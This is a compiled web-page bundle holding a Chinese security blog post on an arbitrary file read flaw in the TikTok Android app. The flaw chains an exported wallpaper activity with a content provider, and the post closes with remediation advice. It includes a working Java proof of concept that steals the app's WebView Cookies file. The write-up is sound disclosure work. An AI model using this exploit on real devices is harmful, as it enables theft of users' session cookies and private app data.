import{o as n,c as a,e as s}from"./app.d48cc1fc.js";const t='{"title":"漏洞描述","description":"","frontmatter":{},"headers":[{"level":2,"title":"title: \\"Tiktok存在任意文件读取问题\\"\\ndate: 2022-01-13T21:57:03+08:00\\nhide: false\\ntags: [\\"security\\",\\"app\\",\\"android\\",\\"tiktok\\"]\\ncategories: [\\"技术相关\\"]","slug":"title-tiktok存在任意文件读取问题-date-2022-01-13t21-57-03-08-00hide-falsetags-security-app-android-tiktok-categories-技术相关"},{"level":2,"title":"漏洞描述","slug":"漏洞描述"},{"level":3,"title":"poc","slug":"poc"},{"level":2,"title":"如何修复以及防范呢?","slug":"如何修复以及防范呢"}],"relativePath":"app_security/tiktok_theft_of_arbitrary.md","lastUpdated":1642039601946}',p={},e=[s('<hr><h2 id="title-tiktok存在任意文件读取问题-date-2022-01-13t21-57-03-08-00hide-falsetags-security-app-android-tiktok-categories-技术相关"><a class="header-anchor" href="#title-tiktok存在任意文件读取问题-date-2022-01-13t21-57-03-08-00hide-falsetags-security-app-android-tiktok-categories-技术相关" aria-hidden="true">#</a> title: &quot;Tiktok存在任意文件读取问题&quot; date: 2022-01-13T21:57:03+08:00 hide: false tags: [&quot;security&quot;,&quot;app&quot;,&quot;android&quot;,&quot;tiktok&quot;] categories: [&quot;技术相关&quot;]</h2><p>Tiktok目前最流行的App,其公司也投入了大量的人力物力来保证App的安全,但是仍然存在严重的漏洞. 今天说的是一个可以clone整个App的漏洞. 和 <a href="https://blog.csdn.net/zy_strive_2012/article/details/96474592" target="_blank" rel="noopener noreferrer">Android中WebView的跨域漏洞分析和应用被克隆问题情景还原(免Root获取应用沙盒数据)</a>效果是一样的.</p><h2 id="漏洞描述"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p><img alt="" data-src="assets/tiktok_theft_of_aribitray_1.png" loading="lazy" class="lazy"> 首先<code>com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity</code> 是导出的Activity,可以接受用户指定的文件并将其设置为墙纸. 用到的关键数据结构是<code>com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean</code>,墙纸的路径是<code>live_wall_paper</code>. 这个值被保存在了LiveWallPaperManager中. 然后是另一个导出的Provider <code>WallPaperDataProvider</code>,可以通过<code>content://com.zhiliaoapp.musically.wallpapercaller/video_path</code>来读取当前的墙纸.</p><p>至此一条完整的攻击链路已经建立,攻击者首先设置App内部的任意文件为墙纸,然后就可以通过 <code>WallPaperDataProvider</code>来读取它. 通过不停的遍历文件,就可以达到应用clone的目的.</p><h3 id="poc"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> poc</h3><div class="language-java line-numbers-mode"><pre><code>    <span class="token class-name">String</span> theft <span class="token operator">=</span> <span class="token string">&quot;/data/user/0/com.zhiliaoapp.musically/app_webview/Default/Cookies&quot;</span><span class="token punctuation">;</span>\n\n    <span class="token class-name">LiveWallPaperBean</span> bean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LiveWallPaperBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">&quot;1337&quot;</span><span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>source <span class="token operator">=</span> theft<span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>thumbnailPath <span class="token operator">=</span> theft<span class="token punctuation">;</span>\n    bean<span class="token punctuation">.</span>videoPath <span class="token operator">=</span> theft<span class="token punctuation">;</span>\n\n    <span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    intent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.zhiliaoapp.musically&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;live_wall_paper&quot;</span><span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    <span class="token class-name">Uri</span> uri <span class="token operator">=</span> <span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.zhiliaoapp.musically.wallpapercaller/video_path&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">new</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">postDelayed</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>\n        <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">&quot;evil&quot;</span><span class="token punctuation">,</span> <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openInputStream</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>th<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">15000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h2 id="如何修复以及防范呢"><a class="header-anchor" href="#如何修复以及防范呢" aria-hidden="true">#</a> 如何修复以及防范呢?</h2><p>这个修复很直观,我们只要限定设定的墙纸必须是有效的图片即可, 或者干脆禁止WallPaperDataProvider,不能再取回墙纸.</p><p>这种类型的漏洞其实是比较难以防范,更像是逻辑漏洞. 但是如果我们坚持了一个基本原则,<strong>凡是外部用户可以输入的数据都不信任,都要校验</strong>,那么这种漏洞其实也是可以幸免的,至少危害不会那么大.这里API的目的就是设置墙纸,那么就应该严格限定只能是墙纸.</p><ol><li>墙纸必须是有效的图片文件</li><li>墙纸来源不能是App自身的文件</li></ol><p>就算是只是限定了条件1,那么危害性也会大大降低.</p><p>参考文档: <a href="https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/" target="_blank" rel="noopener noreferrer">Oversecured detects dangerous vulnerabilities in the TikTok Android app</a></p>',14)];p.render=function(s,t,p,o,c,l){return n(),a("div",null,e)};export{t as __pageData,p as default};
